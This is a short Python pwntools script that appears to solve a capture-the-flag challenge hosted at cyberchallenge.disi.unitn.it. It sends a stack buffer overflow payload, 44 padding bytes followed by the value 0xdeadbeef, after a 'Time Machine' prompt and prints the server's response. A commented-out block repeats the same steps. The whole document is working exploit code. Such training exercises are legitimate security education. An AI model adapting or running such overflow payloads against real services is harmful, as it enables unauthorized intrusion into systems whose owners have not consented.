from pwn import *

p = remote('cyberchallenge.disi.unitn.it', 9001)

offset = 44
value = 0xdeadbeef

payload = b'A'*offset + p64(value)

p.recvuntil('Welcome to the Time Machine! When would you like to go?')

p.sendline(payload)

output = p.recvall(timeout=1)
print(output.decode(errors="ignore"))

"""
p.sendlineafter(b"Welcome to the Time Machine! When would you like to go?", b"A" * offset + p64(value))

output = p.recvall(timeout=1)
print(output.decode(errors="ignore"))
"""

